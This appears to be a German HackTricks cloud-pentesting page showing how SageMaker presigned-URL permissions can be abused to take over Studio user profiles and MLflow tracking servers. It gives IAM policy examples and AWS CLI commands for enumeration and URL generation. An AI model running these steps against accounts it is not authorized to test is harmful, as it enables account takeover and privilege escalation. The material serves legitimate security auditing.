# AWS - SageMaker Unbefugter Zugriff

{{#include ../../../../banners/hacktricks-training.md}}

## SageMaker Studio - Account Takeover via CreatePresignedDomainUrl (Impersonate Any UserProfile)

### Beschreibung
Eine Identität mit der Berechtigung, `sagemaker:CreatePresignedDomainUrl` auf einem Ziel-`UserProfile` des Studio aufzurufen, kann eine Login-URL erzeugen, die direkt in SageMaker Studio als dieses Profil authentifiziert. Dadurch erhält der Browser des Angreifers eine Studio-Sitzung, die die `ExecutionRole`-Berechtigungen des Profils übernimmt und vollen Zugriff auf das EFS-gespeicherte Home-Verzeichnis und die Apps des Profils gewährt. Weder `iam:PassRole` noch Console-Zugriff sind erforderlich.

### Anforderungen
- Eine SageMaker Studio `Domain` und ein Ziel-`UserProfile` darin.
- Der Angreifer-Principal benötigt `sagemaker:CreatePresignedDomainUrl` auf dem Ziel-`UserProfile` (Ressourcen‑Ebene) oder `*`.

Minimales Policy-Beispiel (auf ein UserProfile beschränkt):
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sagemaker:CreatePresignedDomainUrl",
"Resource": "arn:aws:sagemaker:<region>:<account-id>:user-profile/<domain-id>/<user-profile-name>"
}
]
}
```
### Missbrauchsschritte

1) Enumerate a Studio Domain und UserProfiles, die Sie anvisieren können
```bash
DOM=$(aws sagemaker list-domains --query 'Domains[0].DomainId' --output text)
aws sagemaker list-user-profiles --domain-id-equals $DOM
TARGET_USER=<UserProfileName>
```
2) Generiere eine presigned URL (standardmäßig etwa 5 Minuten gültig)
```bash
aws sagemaker create-presigned-domain-url \
--domain-id $DOM \
--user-profile-name $TARGET_USER \
--query AuthorizedUrl --output text
```
3) Öffnen Sie die zurückgegebene URL in einem Browser, um sich bei Studio als Zielbenutzer anzumelden. In einem Jupyter-Terminal innerhalb von Studio überprüfen Sie die effektive Identität:
```bash
aws sts get-caller-identity
```
Hinweise:
- `--landing-uri` kann weggelassen werden. Einige Werte (z. B. `app:JupyterLab:/lab`) können je nach Studio‑Variante/-Version abgelehnt werden; Standardwerte leiten typischerweise zur Studio‑Startseite und dann zu Jupyter weiter.
- Organisationsrichtlinien/VPC-Endpoint-Einschränkungen können den Netzwerkzugriff dennoch blockieren; die Token-Ausstellung erfordert keine Konsolen-Anmeldung oder `iam:PassRole`.

### Auswirkungen
- Laterale Bewegung und Privilegieneskalation durch das Übernehmen eines beliebigen Studio `UserProfile`, dessen ARN erlaubt ist, wodurch dessen `ExecutionRole` sowie Dateisystem/Apps geerbt werden.

### Belege (aus einem kontrollierten Test)
- Mit nur `sagemaker:CreatePresignedDomainUrl` auf einem Ziel-`UserProfile` gab die Angreiferrolle erfolgreich eine `AuthorizedUrl` zurück, wie:
```
https://studio-d-xxxxxxxxxxxx.studio.<region>.sagemaker.aws/auth?token=eyJhbGciOi...
```
- Eine direkte HTTP-Anfrage antwortet mit einer Weiterleitung (HTTP 302) zu Studio, was bestätigt, dass die URL gültig und bis zum Ablauf aktiv ist.


## SageMaker MLflow Tracking Server - ATO via CreatePresignedMlflowTrackingServerUrl

### Beschreibung
Eine Identität mit der Berechtigung, `sagemaker:CreatePresignedMlflowTrackingServerUrl` für einen Ziel-SageMaker MLflow Tracking Server aufzurufen, kann eine einmalig verwendbare presigned URL erstellen, die sich direkt am verwalteten MLflow UI dieses Servers authentifiziert. Das gewährt denselben Zugriff, den ein legitimer Benutzer auf den Server hätte (Experimente und Runs anzeigen/erstellen sowie Artefakte im S3 artifact store des Servers herunterladen/hochladen), ohne Zugriff auf die Konsole oder `iam:PassRole`.

### Voraussetzungen
- Ein SageMaker MLflow Tracking Server im Account/der Region sowie dessen Name.
- Der angreifende Principal benötigt `sagemaker:CreatePresignedMlflowTrackingServerUrl` auf der Ziel-MLflow Tracking Server-Ressource (oder `*`).

Minimales Policy-Beispiel (auf einen Tracking Server beschränkt):
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sagemaker:CreatePresignedMlflowTrackingServerUrl",
"Resource": "arn:aws:sagemaker:<region>:<account-id>:mlflow-tracking-server/<tracking-server-name>"
}
]
}
```
### Missbrauchsschritte

1) MLflow Tracking Servers enumerieren, die du anvisieren kannst, und einen Namen auswählen
```bash
aws sagemaker list-mlflow-tracking-servers \
--query 'TrackingServerSummaries[].{Name:TrackingServerName,Status:TrackingServerStatus}'
TS_NAME=<tracking-server-name>
```
2) Generiere eine presigned MLflow UI URL (für kurze Zeit gültig)
```bash
aws sagemaker create-presigned-mlflow-tracking-server-url \
--tracking-server-name "$TS_NAME" \
--expires-in-seconds 300 \
--session-expiration-duration-in-seconds 1800 \
--query AuthorizedUrl --output text
```
3) Öffnen Sie die zurückgegebene URL in einem Browser, um auf die MLflow UI als authentifizierter Benutzer für diesen Tracking Server zuzugreifen.

Notes:
- Der Tracking Server muss sich in einem betriebsbereiten Zustand befinden (z. B. `Created/Active`). Befindet er sich noch im Status `Creating`, wird der Aufruf abgelehnt.
- Die presigned URL ist einmalig verwendbar und kurzlebig; erzeugen Sie bei Bedarf eine neue.

### Auswirkungen
- Direkter Zugriff auf die verwaltete MLflow UI für den anvisierten Tracking Server, wodurch das Anzeigen und Ändern von experiments/runs sowie das Abrufen oder Hochladen von Artefakten, die im konfigurierten S3 artifact store des Servers gespeichert sind, innerhalb der von der Serverkonfiguration durchgesetzten Berechtigungen ermöglicht wird.

{{#include ../../../../banners/hacktricks-training.md}}
